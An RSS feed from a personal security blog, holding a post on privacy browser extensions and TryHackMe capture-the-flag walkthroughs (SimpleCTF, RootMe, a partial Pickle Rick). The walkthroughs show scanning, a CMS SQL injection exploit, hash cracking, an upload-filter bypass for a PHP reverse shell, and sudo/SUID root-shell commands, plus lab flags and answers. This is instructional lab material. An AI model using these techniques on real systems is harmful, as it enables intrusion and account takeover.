<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on jb</title>
        <link>https://xfafnir.com/posts/</link>
        <description>Recent content in Posts on jb</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
        <lastBuildDate>Tue, 18 Apr 2023 20:17:01 -0500</lastBuildDate>
        <atom:link href="https://xfafnir.com/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Browser_Extensions</title>
            <link>https://xfafnir.com/posts/2023/04/browser_extensions/</link>
            <pubDate>Tue, 18 Apr 2023 20:17:01 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2023/04/browser_extensions/</guid>
            <description>Browser Extensions by: jb-williams Just a little list of browser extensions I fluctuate between using some to all.
All in the hope that at least one person stumbles across it and takes even a little step towards better online security and better visual experience.
All of these should be available in most popular browsers(ex:Google-Chrome,Chromium,Mozilla FireFox,Brave,LibreWolf).
DarkMode Theming Dark Reader: A browser extention that is very popular and makes all websites that you go to render in a &amp;ldquo;Dark Mode&amp;rdquo; setting.</description>
            <content type="html"><![CDATA[<h1 id="browser-extensions">Browser Extensions</h1>
<h2 id="by-jb-williams">by: jb-williams</h2>
<h1 id="heading"></h1>
<p>Just a little list of browser extensions I fluctuate between using some to all.<br>
All in the hope that at least one person stumbles across it and takes even a little step towards better online security and better visual experience.</p>
<h1 id="heading-1"></h1>
<p><em>All of these should be available in most popular browsers(ex:Google-Chrome,Chromium,Mozilla FireFox,Brave,LibreWolf).</em></p>
<h1 id="heading-2"></h1>
<h2 id="darkmode-theming">DarkMode Theming</h2>
<ul>
<li><a href="!https://darkreader.org/">Dark Reader</a>:
<ul>
<li>A browser extention that is very popular and makes all websites that you go to render in a &ldquo;Dark Mode&rdquo; setting.</li>
<li>You can change several different <code>brightness</code> related settings, as well as, the dark coloring.</li>
<li>Simple to turn <code>on</code>/<code>off</code> as needed.</li>
</ul>
</li>
</ul>
<h1 id="heading-3"></h1>
<h2 id="most-of-the-rest-are-privacy-focused-extensions-that-i-tend-to-use"><em>Most of the rest are privacy focused extensions that I tend to use</em></h2>
<ul>
<li><a href="!https://github.com/gorhill/uBlock">Ublock Origin</a>:
<ul>
<li>It&rsquo;s fairly popular, &ldquo;wide-spectrum content blocker&rdquo;, including ad blocking.</li>
<li>Touts CPU and memory efficiency as a primary feature.</li>
</ul>
</li>
<li><a href="!https://privacybadger.org/">Privacy Badger</a>:
<ul>
<li>Another popular tracking and ad blocker.</li>
</ul>
</li>
<li><a href="!https://decentraleyes.org/">Decentraleyes</a>:
<ul>
<li>An extention that limits/blocks tracking from thirdparty content calls from websites.</li>
<li>It acts like a Content Delivery Network, but attempts to load local sources before continueing to try to inject the local resource first.</li>
</ul>
</li>
</ul>
<h1 id="heading-4"></h1>
<p><em>I switch between either using DuckDuckGo or StartPage as my search engine but have both added</em></p>
<ul>
<li>
<p><a href="!https://duckduckgo.com/app">DuckDuckGo Privacy Essentials</a>:</p>
<ul>
<li><em>WARNGING</em> Changes your default search engine from Google to DuckDuckGo. <em>I like not getting paid Google search results first.</em></li>
<li>Blocks many privacy intrusive trackers, fingerprinting, etc.</li>
<li>Automatically enforces Encryptions (HTTPS)</li>
</ul>
</li>
<li>
<p><a href="!https://www.startpage.com/">Startpage Privacy Protection</a>:</p>
<ul>
<li><em>WARNGING</em> Changes your default search engine from Google to Startpage. <em>I like not getting paid Google search results first.</em></li>
<li>Does many of the same things as the DuckDuckGo extension, but <code>Defense in Depth</code> is a strong concept in the security world, so having both doesn&rsquo;t seem to be an issue:</li>
</ul>
</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>THM_SimpleCTF_Walkthrough</title>
            <link>https://xfafnir.com/posts/2023/04/thm_simplectf_walkthrough/</link>
            <pubDate>Mon, 17 Apr 2023 15:34:29 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2023/04/thm_simplectf_walkthrough/</guid>
            <description>SimpleCTF TryHackMe performed by: jb-williams Simple CTF Deploy the machine and attempt the questions! Initial Scan First we run nmap on the target IP. The first scan didn&amp;rsquo;t give me any info and even suggested adding -Pn to the command: nmap -v -T4 -sV -sC -Pn -oA nmap/initial 10.10.237.242 This output will provide the answers for the first two questions. In the nmap output I noticed that the ftp service on port 21 allowed anonymous login.</description>
            <content type="html"><![CDATA[<h1 id="simplectf-tryhackme">SimpleCTF TryHackMe</h1>
<h2 id="performed-by-jb-williams">performed by: jb-williams</h2>
<h1 id="heading"></h1>
<h2 id="simple-ctf">Simple CTF</h2>
<h4 id="deploy-the-machine-and-attempt-the-questions"><strong>Deploy the machine and attempt the questions!</strong></h4>
<h1 id="heading-1"></h1>
<h4 id="initial-scan"><strong>Initial Scan</strong></h4>
<ul>
<li>First we run <code>nmap</code> on the target IP.</li>
<li>The first scan didn&rsquo;t give me any info and even suggested adding <code>-Pn</code> to the command:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -T4 -sV -sC -Pn -oA nmap/initial 10.10.237.242
</span></span></code></pre></div><ul>
<li>This output will provide the answers for the first two questions.</li>
<li>In the <code>nmap</code> output I noticed that the <code>ftp</code> service on port 21 allowed anonymous login.</li>
</ul>
<h1 id="heading-2"></h1>
<ul>
<li>Login to FTP</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp -p 10.10.237.242
</span></span></code></pre></div><ul>
<li>And login as user <code>anonymous</code></li>
<li>Then run <code>passive</code> to see if the output is:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Passive mode: off; fallback to active mode: off.
</span></span></code></pre></div><ul>
<li>Then running the command <code>ls</code> will show a directory called <code>pub</code>.</li>
<li>Change into that directory with <code>cd pub</code> and run <code>ls</code> again.</li>
<li>You will see a file called <code>ForMitch.txt</code>.</li>
<li>To download all files in the directory including <code>ForMitch.txt</code> run the command <code>mget *</code>, and you can exit back out to your terminal.</li>
<li>Viewing the contents of <code>ForMitch.txt</code> with <code>cat</code>, you see that the user Mitch has a very simple password that is easy to crack.</li>
</ul>
<h1 id="heading-3"></h1>
<ul>
<li>I ran <code>feroxbuster</code> on the target machine while if was going over the nmap output and ftp process.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -P http://localhost:8080 -e -u http://10.10.237.242/
</span></span></code></pre></div><ul>
<li>The main finds were paths <code>/simple/</code> and <code>/simple/admin/</code>.</li>
<li>Traveling to the <code>/simple/</code> directory we see that the site is using a content management system <em>CMS Made Simple</em>.</li>
<li>Scanning that page you can see on the bottom left that the version is <code>2.2.8</code></li>
</ul>
<h1 id="heading-4"></h1>
<ul>
<li>Using <code>searchsploit</code> we can see if there are any known exploits for this version.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit cms made simple 2.2.8
</span></span></code></pre></div><ul>
<li>The output shows that there is a known exploit <code>CMS Made Simple &lt; 2.2.10 - SQL Injection</code> with the exploit path of <code>php/webapps/46635.py</code>.</li>
<li>To get the full path and to look at the exploit run:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -x 46635.py
</span></span></code></pre></div><ul>
<li>Noticed that it can be ran with <code>-u</code> for url <code>-w</code> for path/to wordlist and <code>--crack</code> to crack the password. So exited the pager.</li>
<li>After leaving the pager it will show the full path to that exploit.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
</span></span></code></pre></div><ul>
<li>I copied that exploit to my working directory and ran it:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 46635.py -u http://10.10.237.242/simple --crack -w ~/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
</span></span></code></pre></div><ul>
<li>Got an error and opened it up in a text editor.</li>
<li>I noticed that the script started with <code>#!/usr/bin/env python</code> I changed it to <code>#!/usr/bin/env python3</code>.</li>
<li>I also noticed that all the <code>print</code> statements were in <code>python2</code> syntax not <code>python3</code>. And need to change any of the <code>print &quot;&lt;Stuff&gt;&quot;</code> to <code>print (&quot;&lt;Stuff&gt;&quot;)</code>.</li>
<li>To do this quickly all at once I closed the text editor and ran this command on <code>46635.py</code>.</li>
</ul>
<p><em>note: this didn&rsquo;t fully work&hellip; one edit needed to be made..shown below</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;s#&#34;.&#34;#(&amp;)#g&#39;</span> 46635.py
</span></span></code></pre></div><ul>
<li>Thought I was being clever but it actually double parentheses a print statement for me on line <code>183</code>, so I changed that line from:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>print colored<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;&lt;Stuffs&gt;&#34;</span><span style="color:#f92672">))</span>
</span></span></code></pre></div><p><strong>to</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>print <span style="color:#f92672">(</span>colored<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;Stuffs&gt;&#34;</span><span style="color:#f92672">))</span>
</span></span></code></pre></div><ul>
<li>With that done I re-ran:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 46635.py -u http://10.10.237.242/simple --crack -w ~/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
</span></span></code></pre></div><ul>
<li>The <code>--crack</code> option didn&rsquo;t work but I did get output: salt for a password, a username, an email, and a hashed password.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: 1dac0d92e9fa6bb2
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: mitch
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: admin@admin.com
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password found: 0c01f4468bd75d7a84c7eb73846e8d96
</span></span></code></pre></div><ul>
<li>If you run the password hash through <code>hash-identifier</code>, it shows that the hash is likely <code>MD5</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hash-identifier 0c01f4468bd75d7a84c7eb73846e8d96
</span></span></code></pre></div><ul>
<li>We can use <code>hashcat</code> to crack this, put it in <code>passwordhash:salt</code> format.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -O -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">10</span> 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
</span></span></code></pre></div><ul>
<li>The <code>-O</code> is to enalbe optimized kernel</li>
<li>The <code>-a 0</code> is the attack mode for <code>MD5</code></li>
<li>The <code>-m 10</code> is for the setup of the hash and salt <code>passwordhash:salt</code></li>
<li>After the hash and salt the last bit is the path/to the rockyou.txt wordlist.</li>
</ul>
<h1 id="heading-5"></h1>
<ul>
<li>Finding the password for mitch, we attempt to login through ssh port 2222</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh mitch@10.10.237.242 -p <span style="color:#ae81ff">2222</span>
</span></span></code></pre></div><ul>
<li>After logging in run <code>ls</code> you see <code>user.txt</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user.txt
</span></span></code></pre></div><ul>
<li>Also, running <code>ls /home</code> lets you see if there are any other users&rsquo; home folders.</li>
</ul>
<h1 id="heading-6"></h1>
<ul>
<li>After getting the user.txt flag I ran <code>sudo -l</code> to see if there was anyting I could run as sudo with this user, and you can see that they are allowed to use <code>vim</code> without a password.</li>
<li>Navigating to <a href="!https://gtfobins.github.io/">GTFOBins</a> and search for <code>vim</code>, and you can see a couple commands for breaking out of restricted envirnments. I tried option <code>(a)</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;:!/bin/bash&#39;</span>
</span></span></code></pre></div><ul>
<li>Running <code>whoami</code> you can see you are now <code>root</code>.</li>
<li>Run a quick <code>ls /root</code> and see <code>root.txt</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /root/root.txt
</span></span></code></pre></div><h2 id="answers"><em>Answers</em></h2>
<h4 id="how-many-services-are-running-under-port-1000"><strong>How many services are running under port 1000?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>2</code></li>
</ul>
<h1 id="heading-7"></h1>
<h4 id="what-is-running-on-the-hight-port"><strong>What is running on the hight port?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>ssh</code></li>
</ul>
<h1 id="heading-8"></h1>
<h4 id="whats-the-cve-you-re-using-against-the-application"><strong>What&rsquo;s the CVE you-re using against the application?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>CVE-2019-9053</code> <em>(found in the comments of the exploit code)</em></li>
</ul>
<h1 id="heading-9"></h1>
<h4 id="to-what-kind-of-vulnerability-is-the-application-vulnerable"><strong>To what kind of vulnerability is the application vulnerable?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>sqli</code></li>
</ul>
<h1 id="heading-10"></h1>
<h4 id="whats-the-password"><strong>What&rsquo;s the password?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>secret</code></li>
</ul>
<h1 id="heading-11"></h1>
<h4 id="where-can-you-login-with-the-details-obtained"><strong>Where can you login with the details obtained?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>ssh</code></li>
</ul>
<h1 id="heading-12"></h1>
<h4 id="whats-the-user-flag"><strong>Whats the user flag?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>G00d j0b, keep up!</code></li>
</ul>
<h1 id="heading-13"></h1>
<h4 id="is-there-any-other-user-in-the-home-directory-whats-its-name"><strong>Is there any other user in the home directory? What&rsquo;s its name?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>sunbath</code></li>
</ul>
<h1 id="heading-14"></h1>
<h4 id="what-can-you-leverage-to-spawn-a-privileged-shell"><strong>What can you leverage to spawn a privileged shell?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>vim</code></li>
</ul>
<h1 id="heading-15"></h1>
<h4 id="whats-the-root-flag"><strong>What&rsquo;s the root flag?</strong></h4>
<ul>
<li><strong>Answer</strong>: <code>W3ll d0n3. You made it!</code></li>
</ul>
<h1 id="heading-16"></h1>
<h1 id="heading-17"></h1>
<h1 id="heading-18"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>THM_RootMe_Walkthrough</title>
            <link>https://xfafnir.com/posts/2023/04/thm_rootme_walkthrough/</link>
            <pubDate>Sat, 15 Apr 2023 10:41:56 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2023/04/thm_rootme_walkthrough/</guid>
            <description>RootMe TryHackMe performed by: jb-williams Deploy the machine Reconnaissance To get info on the target, run this nmap command: nmap -v -T4 -sV -sC -oA nmap/initial 10.10.105.101 This provides the answers to the following three questions. Scan the machine, how many ports ar open? Answer: 2 What version of Apache is running? Answer: 2.4.29 What service is running on port 22? Answer: ssh Find directories on the web server using the GoBuster tool.</description>
            <content type="html"><![CDATA[<h1 id="rootme-tryhackme">RootMe TryHackMe</h1>
<h2 id="performed-by-jb-williams">performed by: jb-williams</h2>
<h1 id="heading"></h1>
<h3 id="deploy-the-machine"><strong>Deploy the machine</strong></h3>
<h1 id="heading-1"></h1>
<h2 id="reconnaissance">Reconnaissance</h2>
<h1 id="heading-2"></h1>
<ul>
<li>To get info on the target, run this <code>nmap</code> command:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.105.101
</span></span></code></pre></div><ul>
<li>This provides the answers to the following three questions.</li>
</ul>
<h1 id="heading-3"></h1>
<h3 id="scan-the-machine-how-many-ports-ar-open"><strong>Scan the machine, how many ports ar open?</strong></h3>
<ul>
<li><strong>Answer</strong>: <code>2</code></li>
</ul>
<h1 id="heading-4"></h1>
<h3 id="what-version-of-apache-is-running"><strong>What version of Apache is running?</strong></h3>
<ul>
<li><strong>Answer</strong>: <code>2.4.29</code></li>
</ul>
<h1 id="heading-5"></h1>
<h3 id="what-service-is-running-on-port-22"><strong>What service is running on port 22?</strong></h3>
<ul>
<li><strong>Answer</strong>: <code>ssh</code></li>
</ul>
<h1 id="heading-6"></h1>
<h3 id="find-directories-on-the-web-server-using-the-gobuster-tool"><strong>Find directories on the web server using the GoBuster tool.</strong></h3>
<h1 id="heading-7"></h1>
<ul>
<li>To find directories you can use <code>gobuster</code> but I prefer <code>feroxbuster</code>.</li>
<li>Here are the respective commands I would run:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.105.101 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobust.txt -t <span style="color:#ae81ff">15</span>
</span></span></code></pre></div><ul>
<li>Since this(below) is my normal command, I also have it set to go through my webproxy so I can capture the requests/responses.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /urs/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -P http://localhost:8080 -e -u http://10.10.105.101/
</span></span></code></pre></div><h3 id="what-is-the-hidden-direcotry"><strong>What is the hidden direcotry?</strong></h3>
<ul>
<li><strong>Answer</strong>: <code>/panel/</code></li>
</ul>
<h1 id="heading-8"></h1>
<h2 id="getting-a-shell">Getting a Shell</h2>
<h1 id="heading-9"></h1>
<h3 id="find-a-form-to-upload-and-get-a-reverse-shell-and-find-the-flag"><strong>Find a form to upload and get a reverse shell, and find the flag.</strong></h3>
<ul>
<li>With the <code>feroxbuster</code> scan I found both <code>/panel/</code> and <code>/uploads/</code></li>
<li>Traversing to <code>http://&lt;IP&gt;/panel/</code>, there seems to be a file upload page.</li>
<li>Tried uploading a reverse shell <code>.php</code> file from <a href="!https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>. It would not allow that extension so I attempted several other PHP file exetensions.</li>
<li>After a few, I landed on being able to upload a <code>.phtml</code> file.</li>
<li>Then going to the previously mentioned <code>http://&lt;IP&gt;/uploads/</code>, You can see the previously uploaded files as a directory listing.</li>
</ul>
<h1 id="heading-10"></h1>
<h3 id="usertxt"><strong>user.txt</strong></h3>
<ul>
<li>Setup a listener on the port you had provided in the revere shell which <code>nc</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><ul>
<li>Then clicking on your <code>.phtml</code> reverse shell file in the <code>/uploads/</code> will give you a reverse shell one that server.</li>
<li>They give us a prompt for the <code>user.txt</code>, if there is a file avail</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#66d9ef">$(</span>find / -type f -iname user.txt 2&gt; /dev/null<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><ul>
<li>
<p>If you <code>cat</code> that file you get the user flag</p>
</li>
<li>
<p><strong>Answer</strong>: <code>THM{y0u_g0t_a_sh3ll}</code></p>
</li>
</ul>
<h1 id="heading-11"></h1>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h1 id="heading-12"></h1>
<h3 id="search-for-files-with-suid-permission-which-file-is-weird"><strong>Search for files with SUID permission, which file is weird?</strong></h3>
<ul>
<li>To find all <code>SUID</code> files, you can use this command:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
</span></span></code></pre></div><ul>
<li>
<p>Looking through the output, sort of using my local machine as a references, this binary looks out of place.</p>
</li>
<li>
<p><strong>Answer</strong>: <code>/usr/bin/python</code></p>
</li>
</ul>
<h1 id="heading-13"></h1>
<h3 id="find-a-form-to-escalate-your-privileges"><strong>Find a form to escalate your privileges.</strong></h3>
<ul>
<li>Knowing that we have access to the <code>SUID</code> <code>/usr/bin/python</code>, the first thing I tend to do is check <a href="!https://gtfobins.github.io/">GTFOBins</a>, to see if there are any options there.</li>
<li>After attempting the one listed. I actually couldn&rsquo;t get it to work properly, so after looking at previous notes and trying different ways, I found these two commands each work depending on you shell preference.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
</span></span></code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
</span></span></code></pre></div><h1 id="heading-14"></h1>
<h3 id="roottxt"><strong>root.txt</strong></h3>
<ul>
<li>After using that python command, <code>root</code> access was given, again they prompted us with <code>root.txt</code>, assuming it was in the <code>/root</code> directory I just used <code>cat</code> on the absolute path.</li>
<li>You could also use this command if the file was not in the <code>/root</code> directory.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#66d9ef">$(</span>find / -type f -iname root.txt 2&gt; /dev/null<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>THM{pr1v1l3g3_3sc4l4t10n}</code></li>
</ul>
<h1 id="heading-15"></h1>
<h1 id="heading-16"></h1>
<h1 id="heading-17"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>THM_PickleRick_Walkthrough</title>
            <link>https://xfafnir.com/posts/2023/04/thm_picklerick_walkthrough/</link>
            <pubDate>Thu, 13 Apr 2023 10:04:47 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2023/04/thm_picklerick_walkthrough/</guid>
            <description>Pickle Rick TryHackMe performed by: jb-williams Pickle Rick To access the box add the machines IP to this https://&amp;lt;IP&amp;gt;.p.thmlabs.com
Traveling to the sight we can start gathering information First it is always good to View Page Source to see if there are any information disclosers accidently left in the html source code. Doing so, you can see that a comment left in the source code is reminding Rick that the user name for their account is R1ckRul3s Now we scan the box with nmap to see what info we can gather.</description>
            <content type="html"><![CDATA[<h1 id="pickle-rick-tryhackme">Pickle Rick TryHackMe</h1>
<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
<h1 id="heading"></h1>
<h2 id="pickle-rick">Pickle Rick</h2>
<p>To access the box add the machines IP to this <code>https://&lt;IP&gt;.p.thmlabs.com</code></p>
<ul>
<li>Traveling to the sight we can start gathering information</li>
<li>First it is always good to <code>View Page Source</code> to see if there are any information disclosers accidently left in the html source code.</li>
<li>Doing so, you can see that a comment left in the source code is reminding Rick that the user name for their account is <code>R1ckRul3s</code></li>
</ul>
<h1 id="heading-1"></h1>
<ul>
<li>Now we scan the box with nmap to see what info we can gather.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -sC -sV -oN nmap/initial &lt;IP&gt;
</span></span></code></pre></div><ul>
<li>Found that OpenSSH 7.2p2 on port <code>22</code></li>
<li>Found that Apache httpd 2.4.18 on port <code>80</code></li>
</ul>
<h1 id="heading-2"></h1>
<ul>
<li>While nmap was running I went to the site and just to check and see if there is anything interesting in the <code>robots.txt</code> file.</li>
<li>There was a single &lsquo;word&rsquo; in that file: <code>Wubbalubbadubdub</code></li>
</ul>
<h1 id="heading-3"></h1>
<ul>
<li>I like to use <code>feroxbuster</code> instead of <code>gobuster</code>, just preference. So I ran my normal <code>feroxbuster</code> cmd, which also routes it through my web-proxy <code>zaproxy</code>(similar to burp) so I can capture and reuse any requests.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -x php,php5,htm,html,html5,js,txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -P http://localhost:8080 -e -u http://10.10.24.209/
</span></span></code></pre></div><ul>
<li>Found a hidden <code>/login.php</code> route an began fuzzing Rick&rsquo;s login with username <code>R1ckRul3s</code></li>
<li>After some time of fuzzing the password with <code>zaproxy</code> and poking around some, I got back to the <code>/robots.txt</code> and was reminded about <code>Wubbalubbadubdub</code>.</li>
<li>I was able to login to Rick&rsquo;s account with username: <code>R1ckRul3s</code> password: <code>Wubbalubbadubdub</code></li>
</ul>
<h1 id="heading-4"></h1>
<ul>
<li>Logging in brought me to <code>/portal.php</code> with the first page being a <code>Command Panel</code>.</li>
<li>Immediately attempted to run <code>ls</code> and say that it did list out directory contents:</li>
</ul>
